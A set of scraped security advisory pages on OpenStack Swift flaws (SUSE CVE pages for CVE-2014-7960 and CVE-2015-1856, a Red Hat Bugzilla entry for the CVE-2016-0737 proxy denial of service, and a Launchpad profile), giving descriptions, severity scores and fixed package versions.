=== Content from www.suse.com_bd91b4dd_20250126_062854.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2014-7960.html)
[English](https://www.suse.com/security/cve/CVE-2014-7960.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2014-7960.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2014-7960.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2014-7960.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2014-7960.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2014-7960.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2014-7960.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2014-7960

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2014-7948.html) [[Index]](index.html) [[Next]](CVE-2014-7970.html)

### Upstream information

[CVE-2014-7960 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7960)

#### Description

OpenStack Object Storage (Swift) before 2.2.0 allows remote authenticated users to bypass the max\_meta\_count and other metadata constraints via multiple crafted requests which exceed the limit when combined.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [low](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database | SUSE |
| Base Score | 4 | 4 |
| Vector | AV:N/AC:L/Au:S/C:N/I:P/A:N | AV:N/AC:L/Au:S/C:N/I:N/A:P |
| Access Vector | Network | Network |
| Access Complexity | Low | Low |
| Authentication | Single | Single |
| Confidentiality Impact | None | None |
| Integrity Impact | Partial | None |
| Availability Impact | None | Partial |

SUSE Bugzilla entries: [900253](https://bugzilla.suse.com/show_bug.cgi?id=900253) [RESOLVED / FIXED], [927793](https://bugzilla.suse.com/show_bug.cgi?id=927793) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [SUSE-SU-2015:1846-1](https://lists.suse.com/pipermail/sle-security-updates/2015-October/001652.html), published Fri Oct 30 05:09:48 MDT 2015

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE OpenStack Cloud 5 | * `openstack-swift >= 2.1.0-11.1` * `openstack-swift-account >= 2.1.0-11.1` * `openstack-swift-container >= 2.1.0-11.1` * `openstack-swift-doc >= 2.1.0-11.1` * `openstack-swift-object >= 2.1.0-11.1` * `openstack-swift-proxy >= 2.1.0-11.1` * `python-swift >= 2.1.0-11.1` | Patchnames: sleclo50sp3-openstack-swift-12171 |
| SUSE OpenStack Cloud 6 | * `openstack-swift >= 2.1.0-4.1` * `openstack-swift-account >= 2.1.0-4.1` * `openstack-swift-container >= 2.1.0-4.1` * `openstack-swift-object >= 2.1.0-4.1` * `openstack-swift-proxy >= 2.1.0-4.1` * `python-swift >= 2.1.0-4.1` | Patchnames: SUSE OpenStack Cloud 6 GA openstack-swift-2.1.0-3.1 |

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products past their end of life and not receiving proactive updates anymore. | | |
| SUSE Cloud 5 | openstack-swift | Released |
| SUSE OpenStack Cloud 5 | openstack-swift | Released |
| SUSE OpenStack Cloud 5 | openstack-swift-doc | Released |

---

### SUSE Timeline for this CVE

CVE page created: Thu Oct 9 06:15:29 2014

CVE page last modified: Sat Jun 15 22:20:54 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from launchpad.net_9e50c715_20250126_062849.html ===

[Log in / Register](https://launchpad.net/~tristan-cacqueray/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~tristan-cacqueray)

## [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray)

* Overview
* [Code](https://code.launchpad.net/~tristan-cacqueray)
* [Bugs](https://bugs.launchpad.net/~tristan-cacqueray)
* [Blueprints](https://blueprints.launchpad.net/~tristan-cacqueray)
* [Translations](https://translations.launchpad.net/~tristan-cacqueray)
* [Answers](https://answers.launchpad.net/~tristan-cacqueray)

* [Related packages](https://launchpad.net/~tristan-cacqueray/%2Brelated-packages)
* [Related projects](https://launchpad.net/~tristan-cacqueray/%2Brelated-projects)

## User information

Launchpad Id:
tristan-cacqueray

Email:
[Log in](%2Blogin) for email information.

Member since:
2013-10-25

[![Icon of OpenStack Security SIG](https://launchpadlibrarian.net/203991792/os14.png "Member of OpenStack Security SIG")](/~openstack-ossg)

Signed Ubuntu Code of Conduct:
Yes

Languages:

English

OpenPGP keys:

EB103DE8B5E69E631C6FF17922B9A05C925CC5D8

SSH keys:

[localadmin@controller](%2Bsshkeys)

Time zone:

UTC
(UTC+0000)

Karma:
[0](https://launchpad.net/~tristan-cacqueray/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

Social accounts:
![IRC](/@@/social-irc "IRC")
**tristanC**
 on
**irc.freenode.net**

## [All memberships](https://launchpad.net/~tristan-cacqueray/%2Bparticipation) Latest memberships

| [Swiftsync dev](/~swiftsync-devteam)  Joined on 2014-02-13 | |
| --- | --- |
| [OpenStack Security SIG](/~openstack-ossg)  Joined on 2013-12-12 | |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugzilla.redhat.com_ab86f2ce_20250126_062831.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1298924)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1298924)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1298924)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1298924

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1298924**](show_bug.cgi?id=1298924)
(CVE-2016-0737)
- [CVE-2016-0737](https://access.redhat.com/security/cve/CVE-2016-0737) openstack-swift: Client to proxy DoS through Large Objects

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2016-0737 openstack-swift: Client to proxy DoS through Large Objects

| | [Keywords](describekeywords.cgi): | Reopened  Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-0737 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1299668](show_bug.cgi?id=1299668) [1299669](show_bug.cgi?id=1299669) [1299670](show_bug.cgi?id=1299670) [1299671](show_bug.cgi?id=1299671) [1300607](show_bug.cgi?id=1300607) [1300608](show_bug.cgi?id=1300608 "CLOSED EOL - CVE-2016-0737 openstack-swift: Client to proxy DoS through Large Objects [fedora-all]") [1308476](show_bug.cgi?id=1308476) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1298929](show_bug.cgi?id=1298929) [1312737](show_bug.cgi?id=1312737) | | TreeView+ | [depends on](buglist.cgi?bug_id=1298924&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1298924&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-01-15 12:20 UTC by Adam Mariš | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-06-02 06:49 UTC ([History](show_activity.cgi?id=1298924)) | | [CC List:](page.cgi?id=fields.html#cclist) | 36 users (show)  aavati abaron aortega apevec ayoung chrisw dallan derekh gkotton gmollett jjoyce jrusnack jschluet kbasil lhh lpeer markmc mburns nlevinki osoukup rbryant rfortier sclewis security-response-team sgirijan sisharma slinaber slong smohan srevivo ssaha tdecacqu tshefi vbellur yeylon zaitcev | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: | A memory-leak issue was found in OpenStack Object Storage (swift), in the client-to-proxy connection. An OpenStack-authenticated attacker could remotely trigger this flaw to cause denial of service through excess memory consumption. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2016-03-01 10:31:37 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2016:0126](https://access.redhat.com/errata/RHSA-2016%3A0126) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2016-02-08 09:35:30 UTC | | Red Hat Product Errata | [RHSA-2016:0127](https://access.redhat.com/errata/RHSA-2016%3A0127) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2016-02-08 09:35:22 UTC | | Red Hat Product Errata | [RHSA-2016:0128](https://access.redhat.com/errata/RHSA-2016%3A0128) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2016-02-08 09:35:11 UTC | | Red Hat Product Errata | [RHSA-2016:0155](https://access.redhat.com/errata/RHSA-2016%3A0155) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2016-02-10 01:56:35 UTC | | Red Hat Product Errata | [RHSA-2016:0328](https://access.redhat.com/errata/RHSA-2016%3A0328) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2016-03-01 12:02:03 UTC | | Red Hat Product Errata | [RHSA-2016:0329](https://access.redhat.com/errata/RHSA-2016%3A0329) | 0 | normal | SHIPPED\_LIVE | Moderate: openstack-swift security update | 2016-03-01 12:01:20 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1298924#c0)  Adam Mariš    2016-01-15 12:20:58 UTC  ``` A DoS vulnerability in openstack-swift was reported. By repeatedly requesting and interrupting connections to a Large Object (Dynamic or Static) URL, a remote attacker may exhausts Swift proxy-server resources, potentially resulting in a denial of service.  Affects versions: >=2.2.1 <= 2.3.0  Upstream patch:  <https://review.openstack.org/#/c/217750/>  There are similar bugs [CVE-2016-0737](https://access.redhat.com/security/cve/CVE-2016-0737) and [CVE-2016-0738](https://access.redhat.com/security/cve/CVE-2016-0738). This ([CVE-2016-0737](https://access.redhat.com/security/cve/CVE-2016-0737)) is for client to proxy connection.   ```  [Comment 4](show_bug.cgi?id=1298924#c4)  Andrej Nemec    2016-01-21 09:35:14 UTC  ```  Created openstack-swift tracking bugs for this issue:  Affects: fedora-all [[bug 1300608](show_bug.cgi?id=1300608 "CLOSED EOL - CVE-2016-0737 openstack-swift: Client to proxy DoS through Large Objects [fedora-all]")]   ```  [Comment 5](show_bug.cgi?id=1298924#c5)  Andrej Nemec    2016-01-21 09:36:47 UTC  ``` This issue is now public.   ```  [Comment 6](show_bug.cgi?id=1298924#c6)  errata-xmlrpc    2016-02-08 04:35:56 UTC  ``` This issue has been addressed in the following products:    OpenStack 6 for RHEL 7  Via RHSA-2016:0128 <https://rhn.redhat.com/errata/RHSA-2016-0128.html>   ```  [Comment 7](show_bug.cgi?id=1298924#c7)  errata-xmlrpc    2016-02-08 04:36:41 UTC  ``` This issue has been addressed in the following products:    OpenStack 5 for RHEL 7  Via RHSA-2016:0127 <https://rhn.redhat.com/errata/RHSA-2016-0127.html>   ```  [Comment 8](show_bug.cgi?id=1298924#c8)  errata-xmlrpc    2016-02-08 04:37:51 UTC  ``` This issue has been addressed in the following products:    OpenStack 5 for RHEL 6  Via RHSA-2016:0126 <https://rhn.redhat.com/errata/RHSA-2016-0126.html>   ```  [Comment 9](show_bug.cgi?id=1298924#c9)  errata-xmlrpc    2016-02-09 20:56:58 UTC  ``` This issue has been addressed in the following products:    OpenStack 7 For RHEL 7  Via RHSA-2016:0155 <https://rhn.redhat.com/errata/RHSA-2016-0155.html>   ```  [Comment 11](show_bug.cgi?id=1298924#c11)  errata-xmlrpc    2016-03-01 07:02:33 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 6  Via RHSA-2016:0329 <https://rhn.redhat.com/errata/RHSA-2016-0329.html>   ```  [Comment 12](show_bug.cgi?id=1298924#c12)  errata-xmlrpc    2016-03-01 07:03:17 UTC  ``` This issue has been addressed in the following products:    Red Hat Gluster Storage 3.1 for RHEL 7  Via RHSA-2016:0328 <https://rhn.redhat.com/errata/RHSA-2016-0328.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1298924&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.suse.com_7320dd35_20250126_062851.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2015-1856.html)
[English](https://www.suse.com/security/cve/CVE-2015-1856.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2015-1856.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2015-1856.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2015-1856.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2015-1856.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2015-1856.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2015-1856.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
